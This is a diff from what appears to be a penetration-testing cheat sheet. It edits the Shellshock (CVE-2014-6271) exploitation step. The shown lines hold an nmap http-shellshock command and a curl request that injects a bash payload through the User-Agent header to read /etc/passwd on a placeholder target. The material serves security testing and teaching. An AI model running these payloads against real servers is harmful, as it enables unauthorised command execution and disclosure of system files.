@@ -68,7 +68,7 @@
 ### 5.Exploitation
 
 #### 5.1 Exploit ShellShock CVE-2014-6271 (suppose it is at /browser.cgi)
-    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' Target
+    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo; /usr/bin/id' Target
     curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://Target/browser.cgi
 
 #### 5.2 Other common exploits 
